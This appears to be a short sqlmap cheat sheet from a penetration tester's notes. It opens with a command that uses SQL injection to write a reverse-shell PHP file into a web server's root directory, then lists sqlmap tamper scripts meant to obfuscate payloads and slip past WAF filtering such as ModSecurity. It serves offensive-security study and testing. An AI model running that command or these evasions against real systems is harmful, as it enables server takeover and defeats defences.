# SqlMap

`sqlmap -r req.txt -dbs --file-dest=/var/www/html/reverse.php --file-write=./reverse.php`


`sqlmap --list-tampers`  
`space2comment` - convert spaces into comments (/**/)  
`randomcase` - randomizes the case of SQL keywords  
`between` - replace boolean operators with between
`charencode` - encodes characters using URL encoding (%xx)  
`equaltolike` - replace `=` with `LIKE`  
`appendnullbyte` - append a null byte (`%00`) to the end of the payload  
`base64encode` - encodes the entire payload in base64  
`chardoubleencode` - double url-encodes the payload  
`commalesslimit` - replace commas(,) in the `LIMIT` clause with `OFFSET`  
`halfversionedmorekeywords` - adds SQL keywords in comments to obfuscate the query and bypass pattern matching  
`modsecurityversioned` - obfuscates the payload by adding `/*!version*/` comments, which is commonly used to bypass ModSecurty WAF  
`space2hash` - replace spaces with hashes (`#`)  
`overlongutf8` - convert characters to their overlong UTF-8 encoding  
`randomcomments` - insert random comments inside SQL keywords to break WAF filtering mechanisms  
`unionalltounion` - replace `UNION ALL SELECT` with `UNION SELECT` to bypass basic filtering rules for union injections  
`versionedkeywords` - append versioned comments to SQL keywords to obfuscate the payload  
`space2dash` - replace spaces with dashes(`-`)  
`multiplespace` - inserts multiple spaces between SQL keywords  
`nonrecursivereplacement` - replace `UNION SELECT` with ` UNION ALL SELECT` 
`space2tab` - replace spaces with tab characters(`/t`)  
`lowercase` - convert the entire payload to lowercase  
